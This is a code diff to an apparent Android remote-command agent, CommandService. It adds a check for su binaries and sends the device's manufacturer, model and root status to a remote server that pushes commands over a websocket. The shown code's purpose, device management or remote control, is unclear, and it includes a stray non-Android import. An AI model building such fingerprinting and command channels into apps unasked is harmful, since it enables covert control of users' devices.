@@ -8,17 +8,23 @@ import android.os.IBinder;
 import android.os.Build;
 import android.provider.Settings;
 import android.util.Log;
+
 import org.json.JSONObject;
+
 import java.util.Iterator;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
+import java.lang.module.ModuleDescriptor;
 import java.net.HttpURLConnection;
 import java.net.URL;
 // Include your custom utility classes if available
+
 import com.mobilemorph.agent.utils.*;
+
 import io.socket.client.IO;
 import io.socket.client.Socket;
+
 import org.json.JSONObject;
 
 public class CommandService extends Service {
@@ -53,12 +59,45 @@ public class CommandService extends Service {
         return START_STICKY;
     }
 
+    private boolean checkRootAccess() {
+        String[] paths = {
+            "/system/bin/su",
+            "/system/xbin/su",
+            "/sbin/su",
+            "/system/sd/xbin/su",
+            "/system/bin/failsafe/su",
+            "/data/local/xbin/su",
+            "/data/local/bin/su",
+            "/data/local/su"
+        };
+        for (String path : paths) {
+            if (new java.io.File(path).exists()) {
+                return true;
+            }
+        }
+        // Try executing su to confirm
+        try {
+            Process process = Runtime.getRuntime().exec(new String[]{"/system/xbin/which", "su"});
+            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            if (in.readLine() != null) return true;
+        } catch (Exception e) {
+            // Ignore errors here
+        }
+        return false;
+    }
+
+
     private void setupWebSocket(String serverUrl, String deviceId) {
         try {
             mSocket = IO.socket(serverUrl);
             mSocket.on(Socket.EVENT_CONNECT, args -> {
                 Log.d("WS", "Connected");
-                mSocket.emit("register", deviceId);
+                JSONObject registration = new JSONObject();
+                registration.put("device_id", deviceId);
+                registration.put("manufacturer", Build.MANUFACTURER);
+                registration.put("model", Build.MODEL);
+                registration.put("rooted", checkRootAccess());
+                mSocket.emit("register", registration);
             });
             mSocket.on("command", args -> {
                 String cmd = (String) args[0];
@@ -86,7 +125,7 @@ public class CommandService extends Service {
             JSONObject payload = new JSONObject();
             payload.put("device_id", deviceId);
             payload.put("manufacturer", Build.MANUFACTURER);
-            payload.put("rooted", false); // You can replace with a root check later
+            payload.put("rooted", checkRootAccess()); 
             URL url = new URL(SERVER_URL + "/register");
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
